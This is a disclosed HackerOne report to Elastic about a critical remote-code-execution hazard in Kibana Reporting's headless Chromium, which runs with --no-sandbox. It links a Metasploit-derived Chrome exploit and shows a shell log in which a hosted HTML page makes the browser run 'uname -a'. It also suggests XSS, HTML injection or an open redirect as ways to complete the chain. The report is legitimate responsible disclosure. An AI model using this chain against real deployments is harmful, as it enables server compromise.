# RCE hazard in reporting (via Chromium)

## Report Details
- **Report ID**: 1168765
- **URL**: https://hackerone.com/reports/1168765
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2021-04-19T16:26:55.228Z
- **Disclosed**: 2021-05-26T14:52:25.723Z

## Reporter
- **Username**: alexbrasetvik
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: elastic

## Vulnerability Information
**Summary:** Reporting embeds a Chromium that is susceptible to RCEs

**Description:**

Reporting uses a headless Chromium to generate PNGs and PDFs. This is invoked (at least on Elastic Cloud, ECE and ECK) with `--no-sandbox` to work at all.

There are RCEs readily available for Chrome, and at least the versions shipped with 7.11 and 7.12 are susceptible to the attached example.

Attached is an adaptation of this exploit: https://github.com/rapid7/metasploit-framework/pull/15007/files#diff-42ae645fcacbd90d93296471ac57e1d734544af7fb082efd607db0a29d197ac4R53

I have not been able to devise a complete chain yet (thus the "hazard"), but anything that enables pointing reporting at attacker-controlled JS would be able to pop an RCE this way. HTML-injection or XSS (even with the CSP a HTML injection will enable a redirect) or an open redirect would enable pointing reporting at custom JS code.

## Steps To Reproduce:

  1. Host the attached HTML somewhere, in my case it's available on http://192.168.0.154:8009/alexb-says-hi.html
  1. Point the x-pack reporting-embedded Chromium at it (this step is missing to complete the chain)

Here's an example. The attached HTML file gets `uname -a > /tmp/alexb-says-hi` to be run:

```
$ docker run --rm -it docker.elastic.co/kibana/kibana:7.12.0 bash  
bash-4.4$ cd ./x-pack/plugins/reporting/chromium/headless_shell-linux_x64/
bash-4.4$ ls /tmp/
ks-script-esd4my7v  ks-script-eusq_sc5
bash-4.4$ ./headless_shell --no-sandbox http://192.168.0.154:8009/alexb-says-hi.html
[0419/161441.709455:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
[0419/161441.725018:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
[0419/161441.727174:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
[0419/161441.821129:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
^C # CTRL-C after a few seconds. Reporting would kill it after a timeout
bash-4.4$ ls /tmp/
alexb-says-hi  ks-script-esd4my7v  ks-script-eusq_sc5
bash-4.4$ cat /tmp/alexb-says-hi
Linux bd1b285e33b7 4.19.121-linuxkit #1 SMP Thu Jan 21 15:36:34 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```

## Supporting Material/References:

  * HTML-file which when accessed via Reporting's headless Chromium triggers an RCE. (Steps to produce that file via msfconsole is embedded in the HTML file as comments)

## Impact

Kibana is an HTML-injection (even without full-blown XSS) or an open redirect away from being RCE-able via Reporting.

## Attachments
- alexb-says-hi.html
